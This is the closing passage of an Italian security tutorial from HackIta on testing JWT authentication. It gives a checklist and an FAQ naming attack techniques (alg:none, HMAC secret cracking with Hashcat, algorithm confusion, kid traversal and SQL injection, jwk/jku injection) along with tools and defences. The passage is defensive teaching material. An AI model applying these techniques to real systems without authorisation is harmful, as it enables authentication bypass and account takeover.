[ ] alg: none testato (varianti di maiuscole solo con parser legacy)
[ ] Segreto HMAC testato (Hashcat -m 16500 o jwt_tool)
[ ] Algorithm confusion testata con la chiave pubblica esatta
[ ] kid: traversal e SQL injection verificati
[ ] jwk, jku, x5u: chiave incorporata e URL remoto testati
[ ] Claim modificati uno per volta, impatto reale dimostrato
[ ] exp, nbf, iss, aud verificati con token non validi
[ ] Token tra servizi e ambienti diversi provato
[ ] Versione della libreria identificata e advisory controllati
[ ] Logout, cambio password, riuso del refresh token testati
[ ] Evidenze raccolte e test ripetuto dopo la correzione
```

## FAQ

**Che cos'è un JWT e come funziona?**
È un token con tre parti in base64url (header, payload, firma). La firma garantisce l'integrità: chi ha la chiave può emetterlo, chiunque può leggerlo.

**Come verifico se un JWT è vulnerabile?**
Decodificalo, poi modifica un elemento alla volta (firma, `alg`, claim, header) e confronta la risposta con quella di riferimento. Se il server accetta un token alterato, c'è un problema di verifica.

**Quando un JWT è vulnerabile?**
Quando il server accetta un token che viola le regole attese di firma, issuer, audience, scadenza o autorizzazione. La sola presenza di un claim sospetto non basta.

**Che cos'è l'attacco `alg: none`?**
Un token con `alg` impostato a `none` e senza firma. È vulnerabile un server che lo accetta come valido.

**Qual è la differenza tra algorithm confusion e chiave HMAC debole?**
Nella confusione usi la chiave pubblica come segreto HMAC perché il server si fida dell'`alg` del token. Nella chiave debole indovini il segreto con un dizionario.

**Quali strumenti servono per testare un JWT?**
Burp Suite con l'estensione JWT Editor, `jwt_tool`, `curl`, Hashcat per il cracking offline dei segreti HMAC e `myjwt` per l'analisi da terminale.

**Come testo un JWT con Burp Suite?**
Con l'estensione JWT Editor modifichi e firmi il token dentro la richiesta intercettata, e usi gli attacchi guidati (algoritmo `none`, JWK incorporato, algorithm confusion). Guida: [Burp Suite](https://hackita.it/articoli/burp-suite/).

**Come prevengo gli attacchi JWT?**
Lista di algoritmi decisa dal server, chiavi forti e legate all'algoritmo, nessuna fiducia in `jwk`/`jku`/`kid` non validati, controllo di `exp`, `iss`, `aud`, token brevi e refresh con rotazione.

**Posso decodificare un JWT senza la chiave?**
Sì: header e payload sono solo base64url. Non puoi verificare la firma senza la chiave, ma puoi leggere tutto.

**Cos'è myjwt?**
Il tool open source di HackIta per decodificare e analizzare un JWT da terminale, offline e senza dipendenze: [github.com/hack-ita/myjwt](https://github.com/hack-ita/myjwt).

**È legale?**
Solo su sistemi tuoi, con autorizzazione scritta o in lab dedicati.

*Riferimenti: RFC 7519 (JWT), RFC 7515 (JWS), RFC 7518 (JWA), RFC 8037 (EdDSA per JOSE), RFC 8725 (JWT Best Current Practices), OWASP JSON Web Token Cheat Sheet, documentazione di `jwt_tool` e della Web Security Academy di PortSwigger. Verifica sempre opzioni e versioni degli strumenti sul tuo ambiente.*

*Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).*

\#JWT #jwtattacks #algorithmconfusion #jwt\_tool
